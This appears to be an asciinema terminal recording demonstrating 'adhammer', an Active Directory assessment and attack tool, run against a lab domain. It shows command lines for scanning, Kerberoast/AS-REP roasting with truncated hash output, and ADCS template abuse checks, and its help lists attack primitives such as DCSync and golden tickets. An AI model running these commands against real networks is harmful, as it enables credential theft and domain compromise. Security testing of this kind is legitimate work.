{"version": 2, "width": 130, "height": 32, "timestamp": 1755697200, "env": {"SHELL": "/bin/bash", "TERM": "xterm-256color"}}
[0.0, "o", "\u001b[36;1m# adhammer — 30-second capability tour\u001b[0m\r\n\r\n"]
[1.2, "o", "\u001b[35m$\u001b[0m adhammer --version\r\n"]
[2.4, "o", "adhammer 1.3.9\r\n\r\n"]
[3.4, "o", "\u001b[35m$\u001b[0m adhammer --help | head -18\r\n"]
[4.4, "o", "\u001b[36;1madhammer\u001b[0m — Active Directory security assessment and offensive tradecraft in Rust\r\n\r\n"]
[4.6, "o", "USAGE:\r\n    adhammer [FLAGS] <COMMAND>\r\n\r\n"]
[4.9, "o", "COMMANDS:\r\n"]
[5.1, "o", "    scan       Passive audit + control-path graph + JSON/HTML report\r\n"]
[5.3, "o", "    enum       Read-only enumeration (samr/lsa/net/dns/adcs/esc/posture/sessions/wkssvc/hku)\r\n"]
[5.5, "o", "    attack     Active primitives (roast/spray/abuse/coerce/dcsync/golden/exec/rbcd/dcshadow…)\r\n"]
[5.7, "o", "    check      Detached rule packs (adcs, hygiene, trust)\r\n"]
[5.9, "o", "    dump       LAPS · gMSA · secretsdump\r\n\r\n"]
[7.4, "o", "\u001b[36;1m# AUDIT — 41 hygiene checks + control-path graph\u001b[0m\r\n"]
[7.9, "o", "\u001b[35m$\u001b[0m adhammer scan --url ldaps://192.168.91.20:636 --insecure --user administrator@testlab.local --password \u001b[90m********\u001b[0m --format html\r\n"]
[10.0, "o", "\u001b[32;1m[+]\u001b[0m 18 findings — 5 HIGH · 8 MEDIUM · 5 LOW\r\n"]
[10.3, "o", "\u001b[32;1m[+]\u001b[0m 3-hop chain to Tier-0: labuser → Server Operators → DC01$ ⇒ DA\r\n"]
[10.6, "o", "\u001b[90mscan complete in 812 ms · report.html written\u001b[0m\r\n\r\n"]
[12.0, "o", "\u001b[36;1m# POSTURE — relay/coercion exposure over MS-RRP + pipes\u001b[0m\r\n"]
[12.5, "o", "\u001b[35m$\u001b[0m adhammer enum posture --host 192.168.91.20 --domain testlab.local --user administrator --password \u001b[90m********\u001b[0m\r\n"]
[14.6, "o", "\u001b[36m[*]\u001b[0m 192.168.91.20 — SMB auth + \\\\winreg…\r\n"]
[15.2, "o", "\u001b[32;1m[+]\u001b[0m posture read\r\n\r\n"]
[15.4, "o", "\u001b[31;1m[!] [HIGH] A-LdapSigning\u001b[0m — DC does not require LDAP signing (NTLM-relayable)\r\n"]
[15.7, "o", "\u001b[31;1m[!] [HIGH] A-LdapChannelBinding\u001b[0m — DC does not enforce LDAP channel binding\r\n"]
[16.0, "o", "\u001b[31;1m[!]\u001b[0m 2 relay/coercion posture exposure(s) on 192.168.91.20\r\n\r\n"]
[17.4, "o", "\u001b[36;1m# ROAST — Kerberoast + AS-REP in one pass (hashcat-ready)\u001b[0m\r\n"]
[17.9, "o", "\u001b[35m$\u001b[0m adhammer attack roast --url ldaps://192.168.91.20:636 --insecure --user administrator@testlab.local --password \u001b[90m********\u001b[0m --kdc 192.168.91.20\r\n"]
[20.0, "o", "\u001b[36m[*]\u001b[0m 4 SPN-bearing accounts · 2 AS-REP roastable\r\n"]
[20.4, "o", "\u001b[32;1m[+]\u001b[0m svc_sql       → $krb5tgs$18$*svc_sql$TESTLAB.LOCAL$MSSQLSvc/dc01…* (AES256)\r\n"]
[20.7, "o", "\u001b[32;1m[+]\u001b[0m svc_web       → $krb5tgs$18$*svc_web$TESTLAB.LOCAL$HTTP/web01…*    (AES256)\r\n"]
[21.0, "o", "\u001b[32;1m[+]\u001b[0m roastme       → $krb5asrep$23$roastme@TESTLAB.LOCAL:…                 (AS-REP RC4)\r\n\r\n"]
[22.4, "o", "\u001b[36;1m# ADCS — ESC1-15 rule pack in a single pass\u001b[0m\r\n"]
[22.9, "o", "\u001b[35m$\u001b[0m adhammer check adcs --url ldaps://192.168.91.20:636 --insecure --user administrator@testlab.local --password \u001b[90m********\u001b[0m\r\n"]
[25.0, "o", "\u001b[36m[*]\u001b[0m Loaded 12 pKICertificateTemplate objects from Configuration NC\r\n"]
[25.4, "o", "\u001b[31;1m[!] [CRIT] ESC1\u001b[0m  VulnUser  — enrollee-supplies-subject + client-auth + no-manager-approval\r\n"]
[25.7, "o", "\u001b[33;1m[!] [HIGH] ESC15\u001b[0m EFSOnly  — v1 template + Application Policies EKU carrier (EKUwu / CVE-2024-49019)\r\n"]
[26.0, "o", "\u001b[32;1m[+]\u001b[0m 2 exploitable ADCS templates on TESTLAB-CA\r\n\r\n"]
[27.5, "o", "\u001b[36;1m# one static binary. 61 crates behind it. Server 2025 live.\u001b[0m\r\n"]
